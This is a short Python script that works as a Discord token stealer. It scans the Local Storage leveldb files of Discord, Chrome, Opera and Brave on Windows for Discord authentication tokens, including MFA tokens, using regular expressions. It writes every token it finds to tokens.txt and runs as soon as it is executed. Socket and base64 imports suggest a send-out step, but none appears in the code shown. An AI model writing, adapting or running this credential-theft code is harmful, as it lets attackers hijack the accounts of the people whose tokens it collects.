import socket, threading, os, base64, re
from plyer import notification


def findTokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def grabToken():
    f = open('tokens.txt', 'a')
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\discord',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = findTokens(path)
        if len(tokens) > 0:
            for token in tokens:
                f.write(f'{token}\n')
        else:
            print('No Tokens found')

grabToken()
